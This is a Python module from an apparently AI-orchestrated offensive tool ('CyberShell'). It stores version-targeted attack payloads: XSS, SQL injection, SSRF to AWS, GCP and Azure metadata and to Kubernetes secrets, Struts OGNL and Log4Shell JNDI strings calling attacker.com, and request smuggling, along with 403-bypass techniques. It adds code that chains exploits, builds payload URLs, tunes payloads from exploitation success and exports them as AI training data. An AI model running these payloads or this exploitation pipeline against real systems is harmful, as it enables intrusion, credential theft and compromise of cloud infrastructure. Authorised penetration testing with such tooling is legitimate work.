import json
import yaml
import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum
import hashlib
from pathlib import Path
from packaging import version
from packaging.specifiers import SpecifierSet

class VulnCategory(Enum):
    """Vulnerability categories based on HackerOne data"""
    XSS = "Cross-Site Scripting"
    SQLI = "SQL Injection"
    SSRF = "Server-Side Request Forgery"
    RCE = "Remote Code Execution"
    IDOR = "Insecure Direct Object Reference"
    XXE = "XML External Entity"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    CSRF = "Cross-Site Request Forgery"
    AUTH_BYPASS = "Authentication Bypass"
    BUSINESS_LOGIC = "Business Logic Flaw"
    REQUEST_SMUGGLING = "HTTP Request Smuggling"
    RACE_CONDITION = "Race Condition"
    INFO_DISCLOSURE = "Information Disclosure"

@dataclass
class VulnPayload:
    """Structure for vulnerability payloads with product/version support"""
    category: VulnCategory
    name: str
    payload: str
    description: str = ""
    confidence_score: float = 0.5
    context: str = ""  # Where to inject (url, header, body, cookie, etc.)
    detection_pattern: str = ""  # Regex or string to detect success
    tags: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    # NEW: Product and version fields
    product: Optional[str] = None  # e.g., "nginx", "apache", "wordpress"
    version_spec: Optional[str] = None  # e.g., "<=1.14.0", ">=2.0.0,<2.1.0"
    
    def matches_version(self, target_version: str) -> bool:
        """Check if payload matches target version"""
        if not self.version_spec or not target_version:
            return True  # If no version spec, payload applies to all versions
        
        try:
            spec = SpecifierSet(self.version_spec)
            target_v = version.parse(target_version)
            return target_v in spec
        except Exception:
            # Fallback to simple string comparison if parsing fails
            return True

@dataclass
class BypassTechnique:
    """Structure for bypass techniques"""
    name: str
    technique: str
    description: str
    applies_to: List[str] = field(default_factory=list)  # nginx, apache, etc.
    success_rate: float = 0.5

class VulnerabilityKnowledgeBase:
    """Central knowledge base for vulnerability patterns and payloads"""
    
    def __init__(self, kb_path: str = "knowledge_base/"):
        self.kb_path = Path(kb_path)
        self.kb_path.mkdir(exist_ok=True)
        
        # Initialize payload storage
        self.payloads: Dict[VulnCategory, List[VulnPayload]] = {
            category: [] for category in VulnCategory
        }
        
        # Initialize bypass techniques
        self.bypass_techniques: List[BypassTechnique] = []
        
        # Load default payloads
        self._load_default_payloads()
        self._load_bypass_techniques()
        
        # Load custom payloads from files
        self.load_custom_payloads()
    
    def _load_default_payloads(self):
        """Load default vulnerability payloads with product/version info"""
        
        # XSS Payloads with product-specific variants
        xss_payloads = [
            VulnPayload(
                category=VulnCategory.XSS,
                name="Basic Alert XSS",
                payload="<script>alert(1)</script>",
                description="Basic XSS test with alert",
                context="html",
                detection_pattern=r"<script>alert\(1\)</script>",
                confidence_score=0.9,
                product=None,  # Universal
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="Angular Template XSS",
                payload="{{constructor.constructor('alert(1)')()}}",
                description="XSS for Angular applications",
                context="template",
                detection_pattern=r"alert\(1\)",
                confidence_score=0.85,
                product="angular",
                version_spec="<1.6.0"  # Works on older Angular versions
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="WordPress Comment XSS",
                payload='<img src=x onerror="alert(document.domain)">',
                description="XSS via WordPress comment field",
                context="comment",
                confidence_score=0.8,
                product="wordpress",
                version_spec="<5.4.2"
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="React dangerouslySetInnerHTML XSS",
                payload='{"__html":"<img src=x onerror=alert(1)>"}',
                description="XSS in React apps using dangerouslySetInnerHTML",
                context="json",
                confidence_score=0.75,
                product="react",
                version_spec=None  # Depends on implementation
            ),
        ]
        
        # SQL Injection Payloads with database-specific variants
        sqli_payloads = [
            VulnPayload(
                category=VulnCategory.SQLI,
                name="MySQL Union SQLi",
                payload="' UNION SELECT NULL,NULL,version()--",
                description="MySQL-specific union injection",
                context="parameter",
                detection_pattern=r"(5\.\d+\.\d+|8\.\d+\.\d+)",  # MySQL version pattern
                confidence_score=0.9,
                product="mysql",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="PostgreSQL Error SQLi",
                payload="' AND 1=cast((SELECT version()) as int)--",
                description="PostgreSQL error-based injection",
                context="parameter",
                detection_pattern=r"PostgreSQL \d+\.\d+",
                confidence_score=0.85,
                product="postgresql",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="MSSQL Time-based SQLi",
                payload="'; WAITFOR DELAY '00:00:05'--",
                description="Microsoft SQL Server time-based blind injection",
                context="parameter",
                confidence_score=0.8,
                product="mssql",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="WordPress wpdb SQLi",
                payload="1' AND (SELECT * FROM wp_users LIMIT 1)--",
                description="WordPress database-specific SQLi",
                context="parameter",
                confidence_score=0.85,
                product="wordpress",
                version_spec="<5.8.3"
            ),
        ]
        
        # SSRF Payloads with cloud provider specific variants
        ssrf_payloads = [
            VulnPayload(
                category=VulnCategory.SSRF,
                name="AWS Metadata SSRF",
                payload="http://169.254.169.254/latest/meta-data/",
                description="SSRF to AWS metadata endpoint",
                context="url_parameter",
                confidence_score=0.9,
                product="aws",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="GCP Metadata SSRF",
                payload="http://metadata.google.internal/computeMetadata/v1/",
                description="SSRF to Google Cloud metadata",
                context="url_parameter",
                confidence_score=0.9,
                product="gcp",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="Azure Metadata SSRF",
                payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                description="SSRF to Azure metadata endpoint",
                context="url_parameter",
                confidence_score=0.9,
                product="azure",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="Kubernetes API SSRF",
                payload="https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
                description="SSRF to Kubernetes API",
                context="url_parameter",
                confidence_score=0.85,
                product="kubernetes",
                version_spec=None
            ),
        ]
        
        # Server-specific RCE payloads
        rce_payloads = [
            VulnPayload(
                category=VulnCategory.RCE,
                name="Apache Struts OGNL RCE",
                payload="%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('whoami'))}",
                description="Apache Struts OGNL expression injection",
                context="header",
                confidence_score=0.95,
                product="apache_struts",
                version_spec=">=2.3.0,<2.3.35"
            ),
            VulnPayload(
                category=VulnCategory.RCE,
                name="PHP eval() RCE",
                payload="system('id');",
                description="PHP eval() code execution",
                context="parameter",
                confidence_score=0.9,
                product="php",
                version_spec="<7.2.0"
            ),
            VulnPayload(
                category=VulnCategory.RCE,
                name="Node.js eval RCE",
                payload="require('child_process').exec('whoami')",
                description="Node.js eval exploitation",
                context="json",
                confidence_score=0.85,
                product="nodejs",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.RCE,
                name="Log4j JNDI RCE",
                payload="${jndi:ldap://attacker.com/a}",
                description="Log4Shell JNDI injection",
                context="header",
                confidence_score=0.99,
                product="log4j",
                version_spec=">=2.0.0,<2.17.0"
            ),
        ]
        
        # Request Smuggling Payloads for specific servers
        smuggling_payloads = [
            VulnPayload(
                category=VulnCategory.REQUEST_SMUGGLING,
                name="HAProxy CL.TE Smuggling",
                payload="Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
                description="HAProxy-specific smuggling",
                context="raw_request",
                confidence_score=0.7,
                product="haproxy",
                version_spec="<2.0.25"
            ),
            VulnPayload(
                category=VulnCategory.REQUEST_SMUGGLING,
                name="Nginx TE.CL Smuggling",
                payload="Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
                description="Nginx-specific smuggling",
                context="raw_request",
                confidence_score=0.7,
                product="nginx",
                version_spec="<1.17.7"
            ),
        ]
        
        # Add all payloads to knowledge base
        for payload_list in [xss_payloads, sqli_payloads, ssrf_payloads, 
                             rce_payloads, smuggling_payloads]:
            for payload in payload_list:
                self.add_payload(payload)
    
    def _load_bypass_techniques(self):
        """Load 403 bypass techniques"""
        
        bypass_techniques = [
            BypassTechnique(
                name="Double Slash",
                technique="//path",
                description="Add double slash before path segment",
                applies_to=["nginx", "apache"],
                success_rate=0.6
            ),
            BypassTechnique(
                name="Path Traversal",
                technique="..//path",
                description="Use path traversal with double slash",
                applies_to=["nginx"],
                success_rate=0.5
            ),
            BypassTechnique(
                name="URL Encoding",
                technique="%2Fpath",
                description="URL encode path separators",
                applies_to=["apache", "nginx"],
                success_rate=0.7
            ),
            BypassTechnique(
                name="Case Variation",
                technique="Path",
                description="Change case of path components",
                applies_to=["windows", "iis"],
                success_rate=0.4
            ),
            BypassTechnique(
                name="Unicode Encoding",
                technique="%ef%bc%8f",
                description="Use Unicode encoded slash",
                applies_to=["nginx", "apache"],
                success_rate=0.5
            ),
            BypassTechnique(
                name="Parameter Pollution",
                technique="?path=value&path=value2",
                description="HTTP parameter pollution",
                applies_to=["all"],
                success_rate=0.3
            ),
            BypassTechnique(
                name="Header Injection",
                technique="X-Original-URL",
                description="Use alternative routing headers",
                applies_to=["nginx", "apache"],
                success_rate=0.6
            ),
            BypassTechnique(
                name="Method Override",
                technique="X-HTTP-Method-Override",
                description="Override HTTP method via header",
                applies_to=["all"],
                success_rate=0.4
            ),
        ]
        
        self.bypass_techniques.extend(bypass_techniques)
    
    def add_payload(self, payload: VulnPayload) -> bool:
        """Add a new payload to the knowledge base"""
        try:
            self.payloads[payload.category].append(payload)
            return True
        except KeyError:
            return False
    
    def get_payloads_by_category(self, category: VulnCategory) -> List[VulnPayload]:
        """Get all payloads for a specific vulnerability category"""
        return self.payloads.get(category, [])
    
    def get_payloads_by_product(self, product: str, version: Optional[str] = None) -> List[VulnPayload]:
        """Get payloads matching a specific product and version"""
        results = []
        
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                # Check if payload matches product
                if payload.product and payload.product.lower() == product.lower():
                    # Check version if specified
                    if version and payload.version_spec:
                        if payload.matches_version(version):
                            results.append(payload)
                    else:
                        results.append(payload)
                # Also include universal payloads (no product specified)
                elif not payload.product:
                    results.append(payload)
        
        return sorted(results, key=lambda x: x.confidence_score, reverse=True)
    
    def get_payloads_by_confidence(self, min_confidence: float = 0.5) -> List[VulnPayload]:
        """Get payloads above a confidence threshold"""
        results = []
        for category_payloads in self.payloads.values():
            results.extend([p for p in category_payloads if p.confidence_score >= min_confidence])
        return sorted(results, key=lambda x: x.confidence_score, reverse=True)
    
    def search_payloads(self, keyword: str) -> List[VulnPayload]:
        """Search payloads by keyword"""
        results = []
        keyword_lower = keyword.lower()
        
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if (keyword_lower in payload.name.lower() or
                    keyword_lower in payload.description.lower() or
                    keyword_lower in payload.payload.lower() or
                    keyword_lower in [tag.lower() for tag in payload.tags] or
                    (payload.product and keyword_lower in payload.product.lower())):
                    results.append(payload)
        
        return results
    
    def get_bypass_techniques(self, target_server: str = "all") -> List[BypassTechnique]:
        """Get bypass techniques for specific server type"""
        if target_server == "all":
            return self.bypass_techniques
        
        return [t for t in self.bypass_techniques 
                if target_server in t.applies_to or "all" in t.applies_to]
    
    def generate_fuzzing_list(self, category: VulnCategory, 
                             context: Optional[str] = None,
                             product: Optional[str] = None,
                             version: Optional[str] = None) -> List[str]:
        """Generate a fuzzing list for a specific vulnerability category"""
        payloads = self.get_payloads_by_category(category)
        
        # Filter by context
        if context:
            payloads = [p for p in payloads if p.context == context]
        
        # Filter by product/version
        if product:
            filtered = []
            for p in payloads:
                if not p.product or p.product.lower() == product.lower():
                    if version and p.version_spec:
                        if p.matches_version(version):
                            filtered.append(p)
                    else:
                        filtered.append(p)
            payloads = filtered
        
        return [p.payload for p in payloads]
    
    def save_knowledge_base(self):
        """Save current knowledge base to disk"""
        kb_data = {
            "payloads": {},
            "bypass_techniques": []
        }
        
        # Serialize payloads with new fields
        for category, payload_list in self.payloads.items():
            kb_data["payloads"][category.value] = [
                {
                    "name": p.name,
                    "payload": p.payload,
                    "description": p.description,
                    "confidence_score": p.confidence_score,
                    "context": p.context,
                    "detection_pattern": p.detection_pattern,
                    "tags": p.tags,
                    "metadata": p.metadata,
                    "product": p.product,  # NEW
                    "version_spec": p.version_spec  # NEW
                }
                for p in payload_list
            ]
        
        # Serialize bypass techniques
        kb_data["bypass_techniques"] = [
            {
                "name": t.name,
                "technique": t.technique,
                "description": t.description,
                "applies_to": t.applies_to,
                "success_rate": t.success_rate
            }
            for t in self.bypass_techniques
        ]
        
        # Save to file
        kb_file = self.kb_path / "vulnerability_kb.json"
        with open(kb_file, 'w') as f:
            json.dump(kb_data, f, indent=2)
    
    def load_custom_payloads(self):
        """Load custom payloads from files"""
        custom_payloads_dir = self.kb_path / "custom_payloads"
        custom_payloads_dir.mkdir(exist_ok=True)
        
        # Load JSON payloads
        for json_file in custom_payloads_dir.glob("*.json"):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    self._process_custom_payload_data(data)
            except Exception as e:
                print(f"Error loading {json_file}: {e}")
        
        # Load YAML payloads
        for yaml_file in custom_payloads_dir.glob("*.yaml"):
            try:
                with open(yaml_file, 'r') as f:
                    data = yaml.safe_load(f)
                    self._process_custom_payload_data(data)
            except Exception as e:
                print(f"Error loading {yaml_file}: {e}")
    
    def _process_custom_payload_data(self, data: Dict):
        """Process custom payload data from file with product/version support"""
        if "payloads" in data:
            for payload_data in data["payloads"]:
                try:
                    category = VulnCategory[payload_data.get("category", "XSS")]
                    payload = VulnPayload(
                        category=category,
                        name=payload_data.get("name", "Custom Payload"),
                        payload=payload_data.get("payload", ""),
                        description=payload_data.get("description", ""),
                        confidence_score=payload_data.get("confidence_score", 0.5),
                        context=payload_data.get("context", ""),
                        detection_pattern=payload_data.get("detection_pattern", ""),
                        tags=payload_data.get("tags", []),
                        metadata=payload_data.get("metadata", {}),
                        product=payload_data.get("product", None),  # NEW
                        version_spec=payload_data.get("version_spec", None)  # NEW
                    )
                    self.add_payload(payload)
                except Exception as e:
                    print(f"Error processing payload: {e}")
    
    def generate_ai_training_data(self) -> Dict[str, Any]:
        """Generate training data for AI models"""
        training_data = {
            "vulnerability_patterns": {},
            "exploitation_sequences": [],
            "detection_patterns": {},
            "bypass_strategies": [],
            "product_specific_data": {}  # NEW
        }
        
        # Organize patterns by category
        for category in VulnCategory:
            payloads = self.get_payloads_by_category(category)
            training_data["vulnerability_patterns"][category.value] = {
                "payloads": [p.payload for p in payloads],
                "contexts": list(set(p.context for p in payloads if p.context)),
                "confidence_scores": [p.confidence_score for p in payloads],
                "detection_patterns": [p.detection_pattern for p in payloads if p.detection_pattern]
            }
        
        # NEW: Organize by product
        products = set()
        for category_payloads in self.payloads.values():
            for p in category_payloads:
                if p.product:
                    products.add(p.product)
        
        for product in products:
            product_payloads = self.get_payloads_by_product(product)
            training_data["product_specific_data"][product] = {
                "payloads": [p.payload for p in product_payloads],
                "versions": list(set(p.version_spec for p in product_payloads if p.version_spec)),
                "categories": list(set(p.category.value for p in product_payloads))
            }
        
        # Add bypass strategies
        training_data["bypass_strategies"] = [
            {
                "technique": t.technique,
                "success_rate": t.success_rate,
                "applies_to": t.applies_to
            }
            for t in self.bypass_techniques
        ]
        
        return training_data
    
    def get_exploitation_chain(self, vulnerabilities: List[VulnCategory],
                              product: Optional[str] = None,
                              version: Optional[str] = None) -> List[VulnPayload]:
        """Generate an exploitation chain for multiple vulnerabilities"""
        chain = []
        
        for vuln in vulnerabilities:
            # Get payloads for this vulnerability
            payloads = self.get_payloads_by_category(vuln)
            
            # Filter by product/version if specified
            if product:
                filtered = []
                for p in payloads:
                    if not p.product or p.product.lower() == product.lower():
                        if version and p.version_spec:
                            if p.matches_version(version):
                                filtered.append(p)
                        else:
                            filtered.append(p)
                payloads = filtered
            
            if payloads:
                # Get highest confidence payload
                best_payload = max(payloads, key=lambda x: x.confidence_score)
                chain.append(best_payload)
        
        return chain
    
    def update_payload_confidence(self, payload_name: str, 
                                 new_confidence: float, 
                                 category: Optional[VulnCategory] = None):
        """Update confidence score based on exploitation results"""
        search_categories = [category] if category else VulnCategory
        
        for cat in search_categories:
            if cat in self.payloads:
                for payload in self.payloads[cat]:
                    if payload.name == payload_name:
                        # Apply weighted average
                        payload.confidence_score = (
                            0.7 * payload.confidence_score + 0.3 * new_confidence
                        )
                        return True
        
        return False

class VulnerabilityScanner:
    """Scanner that uses the knowledge base for vulnerability detection"""
    
    def __init__(self, kb: VulnerabilityKnowledgeBase):
        self.kb = kb
        
    def scan_for_vulnerability(self, target_url: str, 
                              category: VulnCategory,
                              context: Optional[str] = None,
                              target_info: Optional[Dict] = None) -> List[Dict[str, Any]]:
        """Scan for specific vulnerability type with product awareness"""
        results = []
        payloads = self.kb.get_payloads_by_category(category)
        
        # Filter by context
        if context:
            payloads = [p for p in payloads if p.context == context]
        
        # Filter by product/version if target info available
        if target_info:
            product = target_info.get('product')
            version = target_info.get('version')
            if product:
                filtered = []
                for p in payloads:
                    if not p.product or p.product.lower() == product.lower():
                        if version and p.version_spec:
                            if p.matches_version(version):
                                filtered.append(p)
                        else:
                            filtered.append(p)
                payloads = filtered
        
        for payload in payloads:
            result = {
                "payload": payload,
                "target": target_url,
                "test_url": self._build_test_url(target_url, payload),
                "confidence": payload.confidence_score,
                "product_match": payload.product == target_info.get('product') if target_info else False
            }
            results.append(result)
        
        return results
    
    def _build_test_url(self, base_url: str, payload: VulnPayload) -> str:
        """Build test URL with payload"""
        if payload.context == "parameter":
            return f"{base_url}?test={payload.payload}"
        elif payload.context == "path":
            return f"{base_url}/{payload.payload}"
        else:
            return base_url

# Integration with CyberShell's plugin system
class VulnerabilityKBPlugin:
    """Plugin to integrate with CyberShell's orchestrator"""
    
    def __init__(self, config):
        self.config = config
        self.kb = VulnerabilityKnowledgeBase()
        self.scanner = VulnerabilityScanner(self.kb)
    
    def get_payloads_for_testing(self, vuln_type: str, 
                                 target_info: Optional[Dict] = None) -> List[str]:
        """Get payloads for a specific vulnerability type with target awareness"""
        try:
            category = VulnCategory[vuln_type.upper()]
            product = target_info.get('product') if target_info else None
            version = target_info.get('version') if target_info else None
            
            return self.kb.generate_fuzzing_list(
                category, 
                product=product,
                version=version
            )
        except KeyError:
            return []
    
    def get_bypass_techniques_for_target(self, server_type: str = "nginx") -> List[Dict]:
        """Get bypass techniques for target server"""
        techniques = self.kb.get_bypass_techniques(server_type)
        return [
            {
                "name": t.name,
                "technique": t.technique,
                "success_rate": t.success_rate
            }
            for t in techniques
        ]
    
    def train_ai_model(self):
        """Provide training data to AI orchestrator"""
        return self.kb.generate_ai_training_data()
    
    def update_knowledge_from_results(self, results: Dict):
        """Update knowledge base from exploitation results"""
        if "payload_name" in results and "success" in results:
            confidence = 0.9 if results["success"] else 0.3
            self.kb.update_payload_confidence(
                results["payload_name"],
                confidence
            )
            self.kb.save_knowledge_base()
